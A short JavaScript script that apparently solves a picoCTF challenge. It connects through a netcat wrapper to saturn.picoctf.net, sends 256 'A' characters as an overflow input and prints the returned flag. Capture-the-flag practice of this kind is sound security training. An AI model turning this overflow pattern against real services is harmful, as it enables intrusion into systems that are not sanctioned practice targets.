import nc from "../nc.js";
import "../util.js";


const cat = new nc("nc saturn.picoctf.net 65355");

await cat.open;
await cat.write("A".repeat(0x100) + "\n")
await cat.readUntil("Input: ");;
const flag = await cat.readline();

console.log("[!] " + flag.trim());

await cat.kill();